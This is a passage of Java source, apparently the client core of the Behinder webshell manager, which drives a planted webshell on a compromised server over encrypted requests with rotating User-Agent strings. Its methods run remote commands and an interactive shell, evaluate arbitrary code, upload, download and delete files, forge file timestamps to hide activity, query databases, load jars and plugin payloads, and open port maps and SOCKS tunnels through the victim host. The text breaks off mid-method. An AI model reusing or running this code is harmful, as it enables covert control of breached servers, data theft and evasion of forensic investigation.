package net.rebeyond.behinder.core;

import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import java.io.FileOutputStream;
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.Set;
import javafx.application.Platform;
import javafx.scene.control.Alert;
import javafx.stage.Window;
import net.rebeyond.behinder.utils.Utils;
import org.json.JSONObject;

public class ShellService {
    public String currentUrl;
    public String currentPassword;
    public int encryptType = Constants.ENCRYPT_TYPE_AES; public String currentKey; public String currentType; public Map<String, String> currentHeaders;
    public int beginIndex = 0; public int endIndex = 0;
    public JSONObject shellEntity;
    public static int BUFFSIZE = 46080;
    public static Map<String, Object> currentProxy;
    
    public ShellService(JSONObject shellEntity) throws Exception {
        this.shellEntity = shellEntity;
        this.currentUrl = shellEntity.getString("url");
        this.currentType = shellEntity.getString("type");
        this.currentPassword = shellEntity.getString("password");
        this.currentHeaders = new HashMap<>();
        initHeaders();
        mergeHeaders(this.currentHeaders, shellEntity.getString("headers"));
    }
    
    private void initHeaders() {
        this.currentHeaders.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
        
        this.currentHeaders.put("Accept-Language", "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7");
        if (this.currentType.equals("php"))
        {
            
            this.currentHeaders.put("Content-Type", "text/html;charset=utf-8");
        }
        
        this.currentHeaders.put("User-Agent", getCurrentUserAgent());
    }
    
    private String getCurrentUserAgent() {
        int uaIndex = (new Random()).nextInt(Constants.userAgents.length - 1);
        String currentUserAgent = Constants.userAgents[uaIndex];
        return currentUserAgent;
    }
    
    public static void setProxy(Map<String, Object> proxy) {
        currentProxy = proxy;
    }
    
    public static Map<String, Object> getProxy(Map<String, Object> proxy) {
        return currentProxy;
    }
    
    public JSONObject getShellEntity() {
        return this.shellEntity;
    }
    
    private void mergeCookie(Map<String, String> headers, String cookie) {
        List<String> newCookies = new ArrayList<>();
        String[] cookiePairs = cookie.split(";");
        for (int i = 0; i < cookiePairs.length; i++) {
            
            Set<String> cookiePropertyList = new HashSet<>(Arrays.asList(Constants.cookieProperty));
            String[] cookiePair = cookiePairs[i].split("=");
            if (cookiePair.length > 1) {
                String cookieKey = cookiePair[0];

                if (!cookiePropertyList.contains(cookieKey.toLowerCase().trim()))
                {
                    newCookies.add(cookiePairs[i]);
                }
            } 
        } 
        String newCookiesString = String.join(";", (Iterable)newCookies);
        if (headers.containsKey("Cookie")) {
            String userCookie = headers.get("Cookie");
            headers.put("Cookie", userCookie + ";" + newCookiesString);
        }
        else {
            headers.put("Cookie", newCookiesString);
        } 
    }

    
    private void mergeHeaders(Map<String, String> headers, String headerTxt) {
        for (String line : headerTxt.split("\n")) {
            
            int semiIndex = line.indexOf(":");
            if (semiIndex > 0) {
                
                String key = line.substring(0, semiIndex);
                key = formatHeaderName(key);
                String value = line.substring(semiIndex + 1);
                if (!value.equals(""))
                {
                    headers.put(key, value); } 
            } 
        } 
    }
    
    private String formatHeaderName(String beforeName) {
        String afterName = "";
        for (String element : beforeName.split("-")) {
            
            element = (element.charAt(0) + "").toUpperCase() + element.substring(1).toLowerCase();
            afterName = afterName + element + "-";
        } 
        if (afterName.length() - beforeName.length() == 1 && afterName.endsWith("-"))
            afterName = afterName.substring(0, afterName.length() - 1); 
        return afterName;
    }
    
    public boolean doConnect() throws Exception {
        boolean result = false;
        this.currentKey = Utils.getKey(this.currentPassword);

        try {
            if (this.currentType.equals("php")) {
                try {
                    
                    int randStringLength = (new SecureRandom()).nextInt(3000);
                    String content = Utils.getRandomString(randStringLength);
                    JSONObject obj = echo(content);
                    if (obj.getString("msg").equals(content))
                    {
                        result = true;
                    }
                }
                catch (Exception e) {
                    this.encryptType = Constants.ENCRYPT_TYPE_XOR;
                    try {
                        int randStringLength = (new SecureRandom()).nextInt(3000);
                        String content = Utils.getRandomString(randStringLength);
                        JSONObject obj = echo(content);
                        if (obj.getString("msg").equals(content))
                        {
                            result = true;
                        }
                    }
                    catch (Exception ex) {
                        
                        this.encryptType = Constants.ENCRYPT_TYPE_AES;
                        throw ex;
                    } 
                } 
            } else {           
                try
                {   
                    if (this.currentType.equals("asp"))
                        this.encryptType = Constants.ENCRYPT_TYPE_XOR; 
                    int randStringLength = (new SecureRandom()).nextInt(3000);
                    String content = Utils.getRandomString(randStringLength);
                    JSONObject obj = echo(content);
                    if (obj.getString("msg").equals(content))
                    {
                        result = true;
                    }
                }
                catch (Exception ex)
                {
                    throw ex;
                }
            }
        }
        catch (Exception e) {
            e.printStackTrace();
            Map<String, String> keyAndCookie = Utils.getKeyAndCookie(this.currentUrl, this.currentPassword, this.currentHeaders);
            String cookie = keyAndCookie.get("cookie");
            if ((cookie == null || cookie.equals("")) && !this.currentHeaders.containsKey("cookie")) {
                
                String urlWithSession = keyAndCookie.get("urlWithSession");
                if (urlWithSession != null)
                    this.currentUrl = urlWithSession; 
                this.currentKey = (String)Utils.getKeyAndCookie(this.currentUrl, this.currentPassword, this.currentHeaders).get("key");
            }
            else {
                
                mergeCookie(this.currentHeaders, cookie);
                this.currentKey = keyAndCookie.get("key");
                if (this.currentType.equals("php") || this.currentType.equals("aspx")) {
                    
                    this.beginIndex = Integer.parseInt(keyAndCookie.get("beginIndex"));
                    this.endIndex = Integer.parseInt(keyAndCookie.get("endIndex"));
                } 
            } 
            
            try {
                int randStringLength = (new SecureRandom()).nextInt(3000);
                String content = Utils.getRandomString(randStringLength);
                JSONObject obj = echo(content);
                if (obj.getString("msg").equals(content))
                {
                    result = true;
                }
            }
            catch (Exception ex) {
                
                result = false;
            } 
        } 
        return result;
    }
    public String eval(String sourceCode) throws Exception {
        String result = null;
        byte[] payload = null;
        if (this.currentType.equals("jsp")) {
            payload = Utils.getClassFromSourceCode(sourceCode);
        } else {
            payload = sourceCode.getBytes();
        }

        byte[] data = Utils.getEvalData(this.currentKey, this.encryptType, this.currentType, payload);
        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[])resultObj.get("data");
        result = new String(resData);
        return result;
    }
    
    public JSONObject runCmd(String cmd) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("cmd", cmd);
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "Cmd", params, this.currentType);
        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[])resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        resultTxt = new String(resultTxt.getBytes("UTF-8"), "UTF-8");
        JSONObject result = new JSONObject(resultTxt);

        for (String key : result.keySet())
        {
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }

    public JSONObject createBShell(String target, String localPort) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        
        params.put("action", "create");
        params.put("target", target);
        params.put("localPort", localPort);
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "BShell", params, this.currentType);

        
        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[])resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        resultTxt = new String(resultTxt.getBytes("UTF-8"), "UTF-8");
        
        JSONObject result = new JSONObject(resultTxt);
        for (String key : result.keySet())
        {
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }

    public JSONObject sendBShellCommand(String target, String action, String actionParams) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("action", action);
        params.put("target", target);
        params.put("params", actionParams);
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "BShell", params, this.currentType);
        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[])resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        resultTxt = new String(resultTxt.getBytes("UTF-8"), "UTF-8");
        JSONObject result = new JSONObject(resultTxt);
        for (String key : result.keySet())
        {
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }
    
    public JSONObject submitPluginTask(String taskID, String payloadPath, Map<String, String> pluginParams) throws Exception {
        byte[] pluginData = Utils.getPluginData(this.currentKey, this.encryptType, payloadPath, pluginParams, this.currentType);
        Map<String, String> params = new HashMap<>();
        params.put("taskID", taskID);
        params.put("action", "submit");
        params.put("payload", Base64.encode(pluginData));
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "Plugin", params, this.currentType);
        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[])resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        resultTxt = new String(resultTxt.getBytes("UTF-8"), "UTF-8");
        JSONObject result = new JSONObject(resultTxt);

        for (String key : result.keySet())
        {
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }

    public JSONObject getPluginTaskResult(String taskID) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("taskID", taskID);
        params.put("action", "getResult");
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "Plugin", params, this.currentType);
        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[])resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        resultTxt = new String(resultTxt.getBytes("UTF-8"), "UTF-8");
        JSONObject result = new JSONObject(resultTxt);

        for (String key : result.keySet())
        {
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }

    public JSONObject loadJar(String libPath) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("libPath", libPath);
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "Loader", params, this.currentType);
        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[])resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        JSONObject result = new JSONObject(resultTxt);

        for (String key : result.keySet())
        {
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }

    public JSONObject createRealCMD(String bashPath) throws Exception {
        JSONObject result;
        Map<String, String> params = new LinkedHashMap<>();
        params.put("type", "create");
        params.put("bashPath", bashPath);

        if (this.currentType.equals("php"))
        {
            params.put("cmd", "");
        }

        params.put("whatever", Utils.getWhatever());
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "RealCMD", params, this.currentType);
        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[])resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));

        if (!this.currentType.equals("php")) {
            
            result = new JSONObject(resultTxt);
        } else {
            
            result = new JSONObject();
            result.put("status", Base64.encode("success".getBytes()));
        }

        for (String key : result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }

        return result;
    }
    public JSONObject stopRealCMD() throws Exception {
        JSONObject result;
        Map<String, String> params = new LinkedHashMap<>();
        params.put("type", "stop");
        if (this.currentType.equals("php")) {
            
            params.put("bashPath", "");
            params.put("cmd", "");
        } 
        params.put("whatever", Utils.getWhatever());
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "RealCMD", params, this.currentType);
        
        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[])resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));

        
        if (!this.currentType.equals("php")) {
            
            result = new JSONObject(resultTxt);
        } else {
            
            result = new JSONObject();
            result.put("status", Base64.encode("success".getBytes()));
            result.put("msg", Base64.encode("msg".getBytes()));
        } 
        
        for (String key : result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }
    
    public JSONObject readRealCMD() throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("type", "read");
        if (this.currentType.equals("php")) {
            
            params.put("bashPath", "");
            params.put("cmd", "");
        } 
        
        params.put("whatever", Utils.getWhatever());
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "RealCMD", params, this.currentType);
        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[])resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        JSONObject result = new JSONObject(resultTxt);
        for (String key : result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }
    
    public JSONObject writeRealCMD(String cmd) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("type", "write");
        if (this.currentType.equals("php"))
            params.put("bashPath", ""); 

        params.put("cmd", Base64.encode(cmd.getBytes()));
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "RealCMD", params, this.currentType);
        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[])resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        JSONObject result = new JSONObject(resultTxt);

        for (String key : result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }
    
    public JSONObject listFiles(String path) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("mode", "list");
        params.put("path", path);
        
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
        
        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[])resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        JSONObject result = new JSONObject(resultTxt);

        for (String key : result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }
    public JSONObject getTimeStamp(String path) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("mode", "getTimeStamp");
        params.put("path", path);
        
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
        
        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[])resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        JSONObject result = new JSONObject(resultTxt);
        for (String key : result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }

    public JSONObject updateTimeStamp(String path, String createTimeStamp, String modifyTimeStamp, String accessTimeStamp) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("mode", "updateTimeStamp");
        params.put("path", path);
        params.put("content", "");
        params.put("charset", "");
        params.put("$newpath", "");
        params.put("createTimeStamp", createTimeStamp);
        params.put("modifyTimeStamp", modifyTimeStamp);
        params.put("accessTimeStamp", accessTimeStamp);
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
        
        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[])resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        JSONObject result = new JSONObject(resultTxt);
        for (String key : result.keySet())  {
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }

    public JSONObject updateModifyTimeStamp(String path, String modifyTimeStamp) throws Exception {
        return updateTimeStamp(path, "", modifyTimeStamp, "");
    }

    public JSONObject deleteFile(String path) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("mode", "delete");
        params.put("path", path);
        
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
        
        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[])resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        
        JSONObject result = new JSONObject(resultTxt);
        for (String key : result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }
    
    public JSONObject showFile(String path, String charset) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("mode", "show");
        params.put("path", path);
        if (this.currentType.equals("php")) {
            
            params.put("content", "");
        } else if (this.currentType.equals("asp")) {
        
        } 
        
        if (charset != null)
            params.put("charset", charset); 
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);

        
        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[])resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        
        JSONObject result = new JSONObject(resultTxt);
        for (String key : result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }

    public JSONObject renameFile(String oldName, String newName) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("mode", "rename");
        params.put("path", oldName);
        if (this.currentType.equals("php")) {
            
            params.put("content", "");
            params.put("charset", "");
        } 
        params.put("newPath", newName);
        
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
        
        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[])resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        JSONObject result = new JSONObject(resultTxt);
        for (String key : result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }

    public JSONObject createFile(String fileName) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("mode", "createFile");
        params.put("path", fileName);
        
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
        
        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[])resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        JSONObject result = new JSONObject(resultTxt);

        for (String key : result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }

    public JSONObject createDirectory(String dirName) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("mode", "createDirectory");
        params.put("path", dirName);
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
        
        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[])resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        JSONObject result = new JSONObject(resultTxt);
        for (String key : result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }

    public void downloadFile(String remotePath, String localPath) throws Exception {
        byte[] fileContent = null;
        Map<String, String> params = new LinkedHashMap<>();
        params.put("mode", "download");
        params.put("path", remotePath);
        
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
        
        fileContent = (byte[])Utils.sendPostRequestBinary(this.currentUrl, this.currentHeaders, data).get("data");
        FileOutputStream fso = new FileOutputStream(localPath);
        fso.write(fileContent);
        fso.flush();
        fso.close();
    }

    public JSONObject execSQL(String type, String host, String port, String user, String pass, String database, String sql) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("type", type);
        params.put("host", host);
        params.put("port", port);
        params.put("user", user);
        params.put("pass", pass);
        params.put("database", database);
        params.put("sql", sql);
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "Database", params, this.currentType);
        
        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[])resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        JSONObject result = new JSONObject(resultTxt);
        for (String key : result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }

    
    public JSONObject uploadFile(String remotePath, byte[] fileContent, boolean useBlock) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        
        JSONObject result = null;
        if (!useBlock) {
            params.put("mode", "create");
            params.put("path", remotePath);
            params.put("content", Base64.encode(fileContent));
            byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
            
            Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
            byte[] resData = (byte[])resultObj.get("data");
            String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
            result = new JSONObject(resultTxt);
            for (String key : result.keySet()) {
                result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
            }
        } else {
            List<byte[]> blocks = Utils.splitBytes(fileContent, BUFFSIZE);
            for (int i = 0; i < blocks.size(); i++) {
                if (i == 0) {
                    params.put("mode", "create");
                } else {
                    params.put("mode", "append");
                }    params.put("path", remotePath);
                params.put("content", Base64.encode(blocks.get(i)));
                byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
                
                Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
                byte[] resData = (byte[])resultObj.get("data");
                String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
                result = new JSONObject(resultTxt);
                for (String key : result.keySet()) {
                    result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
                }
            } 
        } 
        return result;
    }

    
    public JSONObject uploadFile(String remotePath, byte[] fileContent) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("mode", "create");
        params.put("path", remotePath);
        params.put("content", Base64.encode(fileContent));
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
        
        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[])resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        
        JSONObject result = new JSONObject(resultTxt);
        for (String key : result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }
    
    public JSONObject appendFile(String remotePath, byte[] fileContent) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("mode", "append");
        params.put("path", remotePath);
        params.put("content", Base64.encode(fileContent));
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
        
        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[])resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        
        JSONObject result = new JSONObject(resultTxt);
        for (String key : result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }
    
    public boolean createRemotePortMap(String targetIP, String targetPort, String remoteIP, String remotePort) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("action", "createRemote");
        params.put("targetIP", targetIP);
        params.put("targetPort", targetPort);
        if (this.currentType.equals("php")) {
            params.put("socketHash", "");
        }
        params.put("remoteIP", remoteIP);
        params.put("remotePort", remotePort);
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "PortMap", params, this.currentType);

        
        Map<String, Object> result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        Map<String, String> resHeader = (Map<String, String>)result.get("header");
        byte[] resData = (byte[])result.get("data");
        if (((String)resHeader.get("status")).equals("200")) {
            if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
                
                resData = Arrays.copyOfRange(resData, 4, resData.length);
                throw new Exception(new String(resData));
            } 
            
            return true;
        } 
        
        return false;
    }

    
    public boolean createRemoteSocks(String targetIP, String targetPort, String remoteIP, String remotePort) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("action", "createRemote");
        params.put("targetIP", targetIP);
        params.put("targetPort", targetPort);
        params.put("remoteIP", remoteIP);
        params.put("remotePort", remotePort);
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "PortMap", params, this.currentType);

        
        Map<String, Object> result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        Map<String, String> resHeader = (Map<String, String>)result.get("header");
        byte[] resData = (byte[])result.get("data");
        if (((String)resHeader.get("status")).equals("200")) {
            if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
                
                resData = Arrays.copyOfRange(resData, 4, resData.length);
                throw new Exception(new String(resData));
            } 
            
            return true;
        } 
        
        return false;
    }

    
    public boolean createPortMap(String targetIP, String targetPort, String socketHash) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("action", "createLocal");
        params.put("targetIP", targetIP);
        params.put("targetPort", targetPort);
        params.put("socketHash", socketHash);
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "PortMap", params, this.currentType);

        
        Map<String, Object> result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        Map<String, String> resHeader = (Map<String, String>)result.get("header");
        byte[] resData = (byte[])result.get("data");
        
        if (((String)resHeader.get("status")).equals("200")) {
            if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
                
                resData = Arrays.copyOfRange(resData, 4, resData.length);
                throw new Exception(new String(resData));
            } 
            
            return true;
        } 
        
        return false;
    }
    
    public byte[] readPortMapData(String targetIP, String targetPort, String socketHash) throws Exception {
        byte[] resData = null;
        Map<String, String> params = new LinkedHashMap<>();
        params.put("action", "read");
        params.put("targetIP", targetIP);
        params.put("targetPort", targetPort);
        params.put("socketHash", socketHash);
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "PortMap", params, this.currentType);
        
        Map<String, Object> result = null;

        
        try {
            result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        } catch (Exception e) {
            
            byte[] exceptionByte = e.getMessage().getBytes();
            if (exceptionByte[0] == 55 && exceptionByte[1] == 33 && exceptionByte[2] == 73 && exceptionByte[3] == 54) {

                
                resData = Arrays.copyOfRange(exceptionByte, 4, exceptionByte.length);
                throw new Exception(new String(resData, "UTF-8"));
            } 

            
            throw e;
        } 

        
        Map<String, String> resHeader = (Map<String, String>)result.get("header");
        if (((String)resHeader.get("status")).equals("200")) {
            resData = (byte[])result.get("data");
            if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {


                
                return null;
            }
            if (resHeader.containsKey("server") && ((String)resHeader.get("server")).indexOf("Apache-Coyote/1.1") > 0) {
                resData = Arrays.copyOfRange(resData, 0, resData.length - 1);
            }
            if (resData == null) {
                resData = new byte[0];
            }
        } else {
            
            resData = null;
        } 
        return resData;
    }
    
    public boolean writePortMapData(byte[] proxyData, String targetIP, String targetPort, String socketHash) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("action", "write");
        params.put("targetIP", targetIP);
        params.put("targetPort", targetPort);
        params.put("socketHash", socketHash);
        if (this.currentType.equals("php")) {
            
            params.put("remoteIP", "");
            params.put("remotePort", "");
        } 
        params.put("extraData", Base64.encode(proxyData));
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "PortMap", params, this.currentType);

        
        Map<String, Object> result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        Map<String, String> resHeader = (Map<String, String>)result.get("header");
        byte[] resData = (byte[])result.get("data");
        if (((String)resHeader.get("status")).equals("200")) {
            if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
                
                resData = Arrays.copyOfRange(resData, 4, resData.length);
                
                return false;
            } 
            return true;
        } 
        
        return false;
    }

    
    public boolean closeLocalPortMap(String targetIP, String targetPort) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("action", "closeLocal");
        params.put("targetIP", targetIP);
        params.put("targetPort", targetPort);
        
